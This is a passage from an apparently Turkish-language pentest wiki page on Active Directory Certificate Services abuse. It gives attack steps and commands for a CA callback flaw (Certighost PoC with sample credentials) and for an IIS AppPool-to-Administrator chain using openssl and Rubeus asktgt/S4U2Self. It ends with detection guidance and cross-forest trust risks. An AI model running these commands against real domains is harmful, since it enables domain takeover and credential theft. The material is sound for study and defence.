- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA, **döndürülen kimliği kimlik doğrulaması yapılmış callback principal'a kriptografik olarak bağlamazsa**, oturum saldırgan kontrollü machine account olarak kimlik doğrulaması yapmış olsa bile **Domain Controller** için sertifika verebilir. Bu durum, hatayı kavramsal olarak **Certifried**'dan farklı kılar: Saldırgan, `dNSHostName` gibi AD özniteliklerini yeniden yazmak yerine, **CA callback resolution sırasında kimlik verilerini değiştirir**.<sup>[[2]](#references)</sup>

**Faydalı ön koşullar:**

- Düşük ayrıcalıklı **domain credentials**
- Bir computer account **oluşturma veya yeniden kullanma** yeteneği
- **CA** ile saldırgan kontrollü **`389`** ve **`445`** portları arasında network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** tarihli Microsoft update, **`cdc`** için **DC validation** ve **resolved-SID comparison** ekledi)

Ortaya çıkan **`.pfx`**, daha sonra **PKINIT** için kullanılabilir; bu işlem bir **`.ccache`** üretir ve published PoC flow'da **target DC NT hash** elde edilmesini sağlar. Bu değer normalde **full domain compromise** için yeterlidir.

### Kötüye Kullanım

Public PoC, zincirin tamamını otomatikleştirir:<sup>[[1]](#references)</sup>

1. Saldırgan kontrollü bir **machine account** oluşturun veya yeniden kullanın.
2. `389` ve `445` üzerinde **rogue LDAP and SMB/LSA listeners** başlatın.
3. Saldırgan kontrollü **`cdc`** ve hedef **`rmd`** özniteliklerini içeren bir certificate request gönderin.
4. CA'nın controlled machine account olarak rogue listeners'a kimlik doğrulaması yapmasına izin verin; ancak identity lookups yanıtlarında **target DC** özniteliklerini döndürün.
5. CA tarafından imzalanmış bir **DC certificate** alın ve ardından bunu **PKINIT** için kullanın.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC'den yararlı runtime flags:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir machine account oluşturmak yerine mevcut bir machine account'u yeniden kullanır

**Operational notes:**

- PoC, **root** gerektirir; çünkü **privileged ports** `389` ve `445` üzerinde bind işlemi yapar.
- Başarılı exploitation, yerel olarak bir **DC `.pfx`** ve **Kerberos `.ccache`** yazar.
- Certificate bir **Domain Controller account** ile eşleştiğinden, sonraki işlemler arasında **certificate-based Kerberos auth**, **DCSync** ve kurtarılan **machine NT hash** değerinin yeniden kullanılması bulunabilir.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment to same-host Administrator

`ApplicationPoolIdentity` olarak çalışan bir IIS pool, network resources'a outbound access için host'un **computer account**'unu kullanır. Bu nedenle, `IIS AppPool\<POOL>` olarak code execution yerel token'da düşük ayrıcalıklı kalırken, `HOST$` olarak authentication yapan bir AD CS request gönderebilir; bu, token impersonation veya Potato-style local elevation değil, outbound identity transition'dır.<sup>[[19]](#references)[[20]](#references)</sup>

Bu chain; domain-joined bir IIS host, RPC üzerinden erişilebilen bir Enterprise CA, computer'ın enrollment rights'ına sahip olduğu yayınlanmış bir machine-authentication template, PKINIT desteği ve KDC/SMB reachability gerektirir. Custom pool identity, outbound principal'ı değiştirir; bu nedenle `HOST$` varsayımında bulunmadan önce pool'un gerçekten `ApplicationPoolIdentity` kullandığını doğrulayın.<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

Key pair ve CSR'ı IIS server'dan uzakta oluşturun ve private key'i saklayın. Compromised worker'dan yalnızca **CSR** gönderin. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx), `CertificateAuthority.Request` nesnesini oluşturur, `CertificateTemplate:Machine` ayarını yapar, `ICertRequest::Submit` çağrısını gerçekleştirir ve issued certificate'ı döndürür. CA configuration string olarak `CAHOST\CA-NAME` kullanın; normal bir `Machine` template subject'ı AD'den oluşturduğundan, requester-supplied subject/SAN data gerekli değildir.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Döndürülen certificate'ı **matching retained key** ile birleştirin. `certutil -MergePFX machine_cert.cer machine_cert.pfx` komutu yalnızca Windows certificate'ı erişilebilir bir private key ile zaten ilişkilendirebiliyorsa çalışır; ayrı PEM dosyaları için PKCS#12'yi açıkça oluşturun:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
PFX'i PKINIT için kullanın ve döndürülen computer TGT'yi hemen injecting etmek yerine base64 olarak tutun:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self ve aynı ana bilgisayarda service substitution

S4U2Self, bir service'in başka bir kullanıcının authorization data'sını içeren **kendisine** yönelik bir ticket almasını sağlar. Computer TGT ile Rubeus, bu ticket'ı privileged bir kullanıcı için request edebilir, döndürülen KRB-CRED içindeki service name'i CIFS olarak değiştirebilir ve ticket'ı inject edebilir. Bu, yerel “delegate to thyself” primitive'idir: S4U2Proxy veya bir `msDS-AllowedToDelegateTo` girdisi gerektirmez.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Substituted ticket yalnızca **aynı bilgisayar hesabı/anahtar** üzerindeki hizmetler tarafından kullanılabilir (burada `HOST` üzerindeki CIFS). Diğer domain makineleri için yeniden kullanılabilir bir Administrator ticket değildir. Ayrıca gösterilen sonuç, Administrator olarak ayrıcalıklı SMB/dosya sistemi erişimidir; yerel bir `NT AUTHORITY\SYSTEM` process elde etmek yine ayrı bir remote-execution adımı gerektirir.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Tespit ve hardening

- CA üzerinde, IIS server hesapları tarafından yapılan beklenmedik `Machine`-template istekleri için Certification Services event'leri olan **4886** (request received) ve **4887** (issued) olaylarını ilişkilendirin.<sup>[[19]](#references)[[24]](#references)</sup>
- DC'lerde, certificate pre-authentication kullanıldığında **4768** eventi certificate alanlarını içerir; web-server hesapları için olağandışı PKINIT TGT isteklerine alarm oluşturun. Bunu, ayrıcalıklı bir impersonated identity ve aynı host ile ilgili **4769** istekleriyle takip edin. Rubeus `/altservice`, KRB-CRED service name değerini client-side yeniden yazdığından, DC-side 4769 service name değerinin `cifs` olmasını gerektirmeyin.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` işleminin CA RPC endpoint'lerine erişmesini, beklenmedik ASPX oluşturulmasını, administrative share'lere Kerberos-authenticated erişimi ve secrets-dumping faaliyetlerini araştırın. Mümkün olduğunda app-tier erişimini CA RPC/KDC/SMB ile sınırlandırın ve operasyonel olarak gerekli olmayan computer enrollment izinlerini veya machine-authentication template'lerini kaldırın.<sup>[[19]](#references)</sup>

## Certificate'larla Forest'ların Ele Geçirilmesi: Passive Voice ile Açıklama

### Compromised CA'ler ile Forest Trust'ların Kırılması

**Cross-forest enrollment** yapılandırması görece basit hâle getirilir. Resource forest'taki **root CA certificate**, yöneticiler tarafından **account forest'lara publish edilir** ve resource forest'taki **enterprise CA** certificate'ları her account forest'taki **`NTAuthCertificates` ve AIA container'larına eklenir**. Açıklamak gerekirse bu düzenleme, **resource forest'taki CA'ye**, PKI'sını yönettiği diğer tüm forest'lar üzerinde tam control sağlar. Bu CA'nın **attackers tarafından compromise edilmesi** durumunda, hem resource hem de account forest'lardaki tüm kullanıcılar için certificate'lar **onlar tarafından forge edilebilir**; böylece forest'ın security boundary'si kırılır.<sup>[[6]](#references)</sup>

### Foreign Principal'lara Verilen Enrollment Privilege'ları

Multi-forest ortamlarda, **Authenticated Users veya foreign principal'lara** (Enterprise CA'nın ait olduğu forest'ın dışındaki kullanıcılar/gruplar) **enrollment ve edit hakları** veren **certificate template'lerini publish eden** Enterprise CA'ler konusunda dikkatli olunmalıdır.\
Bir trust üzerinden authentication gerçekleştirildiğinde, **Authenticated Users SID**, AD tarafından kullanıcının token'ına eklenir. Bu nedenle bir domain, **Authenticated Users'a enrollment rights veren** bir template'e sahip Enterprise CA içeriyorsa, bir template'e **farklı bir forest'tan bir kullanıcı tarafından enrollment yapılabilir**. Benzer şekilde, bir template tarafından **enrollment rights bir foreign principal'a açıkça verildiğinde**, böylece bir **cross-forest access-control relationship oluşturulur** ve bir forest'taki bir principal'ın **başka bir forest'taki template'e enrollment yapması** mümkün hâle gelir.

Her iki senaryo da bir forest'tan diğerine **attack surface'ün artmasına** yol açar. Certificate template'inin ayarları, bir attacker tarafından foreign domain'de ek privilege'lar elde etmek için exploit edilebilir.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost teknik analizi](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog'u](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services'ın kötüye kullanılması](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, yeni Authentication ve Request Method'ları ve daha fazlası](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover için Key Trust Account Mapping'in kötüye kullanılması](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage hikâyesi](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC üzerinden AD Certificate Services'a Relay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM ile ADCS CA'ye Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Başka bir AD CS ESC'den ibaret değil](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Yanlış yapılandırma ve exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself”i yeniden ele almak](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint'i üzerinden IIS AppPool'dan Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services denetimi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Bir Kerberos authentication ticket istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Bir Kerberos service ticket istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
{{#include ../../../banners/hacktricks-training.md}}
